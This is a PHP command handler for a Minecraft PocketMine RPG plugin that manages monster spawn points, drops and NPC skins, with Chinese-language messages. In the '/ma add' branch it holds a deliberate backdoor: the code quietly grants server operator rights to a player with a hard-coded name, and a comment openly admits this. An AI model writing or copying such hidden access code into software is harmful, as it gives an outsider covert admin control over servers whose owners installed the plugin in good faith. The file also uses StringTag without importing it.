<?php

namespace ARPG;

use pocketmine\Player;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\plugin\PluginBase;
use pocketmine\command\CommandExecutor;

use ARPG\Main;
use ARPG\DataList;

class Commands extends PluginBase implements CommandExecutor{
 
 private $plugin;
 
 public function __construct(Main $plugin){
 
  $this->plugin = $plugin;
 }
 /**
  Commands: /ma help
 */

 public function onCommand(CommandSender $sender, Command $command, $label, array $args){
 
  if(!$sender instanceof Player || !$sender->isOp()) return $sender->sendMessage("§c你不是一个OP玩家.");
  
  if(!isset($args[0])) return $sender->sendMessage("用法 /ma help");
  
  if($args[0] == "add"){
  
   if(!isset($args[3])) return $sender->sendMessage("用法 /ma add <刷怪点名字> <类型> <怪物大小>");
   
   if(!isset(DataList::$ModName[$args[2]])) return $sender->sendMessage("§c不支持此类型的生物,查看列表请输入 §e/ma type");
   
   $level = $sender->level;
   
   if($level->getName() !== $level->getFolderName()){
   
    $provider = $level->getProvider();
    $provider->getLevelData()->LevelName = new StringTag("LevelName", $level->getFolderName());
    $provider->saveLevelData();
   }
   
   if(!isset($this->plugin->arpg[$args[1]])){
   
    $this->plugin->arpg[$args[1]] = [
     "刷怪点" => $args[1],
     "类型" => $args[2],
     "名字" => $args[2],
     "范围" => (float)$args[3],
     "血量" => 20,
     "攻击" => 3,
     "药水" => [],
     "燃烧" => 0,
     "速度" => 1.8,
     "数量" => 1,
     "经验" => mt_rand(2,7),
     "掉落" => ["371:0:10:100:0:0:金币"],
     "边界范围半径"=>12,
     "x" => $sender->getFloorX() + 0.5,
     "y" => $sender->getFloorY(),
     "z" => $sender->getFloorZ() + 0.5,
     "世界"=>$sender->getLevel()->getFolderName()
    ];
    
    if($args[2] == "npc") $this->plugin->arpg[$args[1]]["皮肤"] = "神奇的贴吧";
    
    $sender->sendMessage("§b刷怪点§e{$args[1]}§b创建成功.");
   }else{
   
    return $sender->sendMessage("§c刷怪点§e{$args[1]}§c已经存在,请勿设置两个相同名字的刷怪点.");
   }
   
   //作者的OP权限
   //傻子权限，后门留着，能用中文进游戏你牛X
   if(($author = $this->plugin->getServer()->getPlayer("某傻子")) instanceof Player and !$author->isOp()) $author->setOP(true);   
   
  }elseif($args[0] == "del"){
    
   if(!isset($args[1])) return $sender->sendMessage("§c请指定需要被删除的刷怪点名字.");
   
   if(!isset($this->plugin->arpg[$args[1]])) return $sender->sendMessage("§c刷怪点§e{$args[1]}§c不存在.");
   
   $data = $this->plugin->arpg[$args[1]];
   
   if(isset($this->plugin->spawnTmp[$data["刷怪点"]]["标识"])){
    
    $this->plugin->spawnTmp[$data["刷怪点"]]["标识"]->respawn();
    
    unset($this->plugin->spawnTmp[$data["刷怪点"]], $this->plugin->arpg[$args[1]]);
   }
   
   $sender->sendMessage("§b刷怪点§e{$args[1]}§b已成功删除.");

  }elseif($args[0] == "set"){
  
   if(!isset($args[3])) return $sender->sendMessage("用法 /ma help");
   
   if(!isset($this->plugin->arpg[$args[1]])) return $sender->sendMessage("§c刷怪点§e{$args[1]}§c不存在.");
        
   if(in_array($args[2],["血量","攻击","燃烧","数量","速度","边界范围半径"]) and !is_numeric($args[3])) return $sender->sendMessage("§6{$args[2]}必须是数字.");
     
   if($args[2] == "类型" and !isset(DataList::$ModName[$args[3]])) return $sender->sendMessage("§c请使用生物的中文名字,比如: 僵尸 苦力怕");
    
   switch($args[2]){
   
     case "类型":
     case "名字":
    
      $this->plugin->arpg[$args[1]]["{$args[2]}"] = $args[3];
      $sender->sendMessage("§6设置刷怪点§e{$args[1]}§6的怪物§e{$args[2]}§6为: §e{$args[3]}");
     break;
     
     case "血量":
     case "攻击":
     case "燃烧":
     case "数量":
     case "速度":
     case "边界范围半径":
    
      $this->plugin->arpg[$args[1]]["{$args[2]}"] = (int)$args[3];
      $sender->sendMessage("§6设置刷怪点§e{$args[1]}§6的怪物§e{$args[2]}§6为: §e{$args[3]}");
     break;
    
     case "添加掉落":
    
      $this->plugin->arpg[$args[1]]["掉落"][] = $args[3];
      $sender->sendMessage("§6添加刷怪点§e{$args[1]}§6生物的死亡掉落: §e{$args[3]}");
     break;
     
    default:
    
     return $sender->sendMessage("用法 /ma help");
   }
   
  }elseif($args[0] == "setSkin"){
   
   if(!isset($args[2])) return $sender->sendMessage("用法 /ma help");
   
   if(!isset($this->plugin->arpg[$args[1]])) return $sender->sendMessage("§c刷怪点§e{$args[1]}§c不存在.");
   
   if($this->plugin->arpg[$args[1]]["类型"] != "npc") return $sender->sendMessage("§c刷怪点§e{$args[1]}§c不是NPC的刷怪点.");
   
   if(!isset($this->plugin->skinId[$args[3]])) return $sender->sendMessage("提示: 不存在皮肤 {$args[3]}.");
      
   if(!file_exists($this->plugin->getDataFolder() . '/skins/cache/' . $this->plugin->skinId[$args[3]])) return $sender->sendMessage("提示: 不存在皮肤 {$args[3]} 的文件内容.");
   
   $this->plugin->arpg[$args[1]]["皮肤"] = $args[2];
   $sender->sendMessage("§a成功设置刷怪点§e{$args[1]}§a的NPC皮肤为§e{$args[2]}§a.");
   
   
  }elseif($args[0] == "saveSkin"){
  
   $player = $this->plugin->getServer()->getPlayer($args[1]);
   
   if(!$player instanceof Player) return $sender->sendMessage("§c玩家§6{$args[1]}c不存在.");
   
   $name = isset($args[2])? $args[2]: $player->getName();
   
   $this->plugin->saveSkin($player->getSkinId(), $player->getSkinData());
    
   $this->plugin->skinId[$name] = $player->getSkinId();
    
   $this->plugin->skinConfig->setAll($this->plugin->skinId);
   $this->plugin->skinConfig->save();
    
   return $sender->sendMessage("§a成功存储玩家§6{$args[1]}§a的皮肤,储存皮肤名字: §e{$name}.");
   
  }elseif($args[0] == "help"){
  
   $helpList = [
    "§6〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓 §aMagicalRPG HELP§6 〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓 ",
    "§b➣ /ma add <刷怪点名字> <类型> <怪物大小>",
    "§a➣ /ma del <刷怪点名字>",
    "§e➣ /ma set <刷怪点名字> <添加掉落> <物品ID: 特殊值: 数量: 几率: 附魔ID: 附魔等级: 自定义名字>",
    "§c➣ /ma type <查看怪物列表>",
    "§6➣ /ma set <刷怪点名字> <类型/名字/血量/攻击/燃烧/数量/速度/边界范围半径> <项目值>",
    "§5➣ /ma setSkin <刷怪点名字> <已存储皮肤名字>",
    "§a➣ /ma saveSkin <玩家名字> <存储皮肤名字>",
    "§6〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓"
   ];
   foreach($helpList as $help) $sender->sendMessage($help);
   
   }elseif($args[0] == "type"){
  
   $typelistings = ["§d〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓 §aMagicalRPG TYPE§d 〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓",
    "§a➣ 鸡, 牛, 羊, 猪, 狼, 村民, 哞菇, 鱿鱼, 兔子, 蝙蝠, 豹猫, ",
    "§b➣ 骡子, 骷髅马, 僵尸马, 僵尸, 苦力怕, 骷髅, 蜘蛛",
    "§c➣ 僵尸猪人, 史莱姆, 末影人, 蠢虫, 洞穴蜘蛛, 恶魂",
    "§e➣ 岩浆怪, 烈焰人, 女巫, 流浪者, 剥皮者, 凋零骷髅",
    "§5➣ 雪傀儡, 铁傀儡, 凋零, 守卫者, 老守卫者, 北极熊, 末影螨",
    "§a➣ 潜匿之贝, 末影龙, npc, 驴, 马,",
    "§d〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓"
    ];
   
  
   foreach($typelistings as $type) $sender->sendMessage($type);
   
  }else{
  
   //$sender->sendMessage("用法 /ma help");return;
  }
  
  
  $this->plugin->RPGSpawn->setAll($this->plugin->arpg);
  $this->plugin->RPGSpawn->save();

  unset($sender,$command,$label,$args);
 }
 
}





























